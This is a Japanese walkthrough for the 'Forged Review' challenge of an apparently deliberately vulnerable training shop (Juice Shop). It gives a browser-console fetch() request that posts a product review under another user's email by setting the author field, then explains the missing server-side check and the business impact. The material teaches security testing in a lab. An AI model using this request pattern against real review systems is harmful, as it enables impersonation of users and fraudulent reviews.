# Forged Review ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** IDOR
**目標:** 他のユーザーとしてレビューを投稿する

---

## 実行手順

DevToolsのConsoleで以下を実行:

```javascript
fetch('/rest/products/1/reviews', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    message: "Forged review",
    author: "jim@juice-sh.op"
  })
})
```

## 解説

- `author` フィールドに任意のメールアドレスを指定
- サーバーが「このレビューは本当にこのユーザーからか？」を検証していない
- 有名人やインフルエンサーになりすまして偽レビューを投稿可能

**ビジネスへの影響:**
- 競合商品の評価を下げる
- 自社商品の評価を偽装
- レピュテーション（評判）の操作

## 関連チャレンジ

- [Forged Feedback](forged-feedback.md)
- [View Basket](../difficulty-2/view-basket.md)
